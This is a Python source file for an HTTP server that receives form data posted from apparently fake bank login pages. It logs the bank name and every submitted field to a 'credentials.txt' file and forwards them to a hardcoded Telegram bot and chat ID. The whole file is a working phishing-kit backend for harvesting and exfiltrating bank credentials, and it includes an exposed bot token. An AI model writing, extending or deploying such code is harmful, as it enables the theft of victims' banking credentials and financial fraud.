import http.server
import socketserver
import urllib.parse
import urllib.request
import json
import os
from datetime import datetime

PORT = 8080

TELEGRAM_TOKEN = "8251141801:AAEdwFG8yB2j6PphnczwbnW3dq7heDoEc3w"
TELEGRAM_CHAT_ID = "6788012481"

def send_to_telegram(message):
    try:
        url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
        data = json.dumps({
            "chat_id": TELEGRAM_CHAT_ID,
            "text": message
        }).encode('utf-8')
        
        req = urllib.request.Request(url, data=data, headers={'Content-Type': 'application/json'})
        with urllib.request.urlopen(req, timeout=5) as response:
            return response.status == 200
    except Exception as e:
        print(f"Failed to send to Telegram: {e}")
        return False

class CustomHandler(http.server.SimpleHTTPRequestHandler):
    def do_POST(self):
        if self.path == '/save':
            content_length = int(self.headers['Content-Length'])
            post_data = self.rfile.read(content_length)
            
            try:
                data = json.loads(post_data.decode('utf-8'))
                bank = data.get('bank', 'Unknown')
                page_type = data.get('type', 'Unknown')
                fields = data.get('fields', {})
                
                timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                
                # Format for Telegram (more readable)
                tg_msg = f"🔔 NOUVELLE DONNÉE - {bank.upper()} ({page_type})\n\n"
                
                # Format for file
                file_msg = f"\n[{timestamp}] BANK: {bank} | PAGE: {page_type}\n"
                
                for k, v in fields.items():
                    if v and str(v).strip():
                        tg_msg += f"🔸 {k}: {v}\n"
                        file_msg += f"  - {k}: {v}\n"
                
                # Save to local file
                with open('credentials.txt', 'a', encoding='utf-8') as f:
                    f.write(file_msg)
                    
                # Send to Telegram
                send_to_telegram(tg_msg)
                    
                self.send_response(200)
                self.send_header('Content-type', 'application/json')
                self.end_headers()
                self.wfile.write(b'{"status":"success"}')
                print(f"Saved and sent data for {bank} ({page_type})")
                
            except Exception as e:
                self.send_response(400)
                self.end_headers()
                print("Error saving data:", e)
        else:
            self.send_response(404)
            self.end_headers()

with socketserver.TCPServer(("", PORT), CustomHandler) as httpd:
    print(f"Serving at port {PORT}. Waiting for data to send to Telegram...")
    httpd.serve_forever()
